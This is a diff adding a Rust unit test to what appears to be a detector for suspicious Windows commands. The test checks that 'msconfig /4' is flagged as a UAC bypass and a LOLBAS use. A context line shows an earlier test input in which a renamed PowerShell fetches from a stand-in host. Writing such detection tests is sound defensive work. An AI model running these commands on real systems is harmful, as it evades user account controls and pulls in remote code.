@@ -12570,6 +12570,26 @@ C:\Users\Public\psh.pif -NoProfile -Command "iwr https://esentutl-alias.example/
             env.traits
         );
     }
+
+    #[test]
+    fn msconfig_4_direct_command_emits_uac_bypass_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line("msconfig /4", &mut env);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "msconfig-4")),
+            "msconfig /4 direct command was not surfaced: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "msconfig")),
+            "msconfig /4 direct command was not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
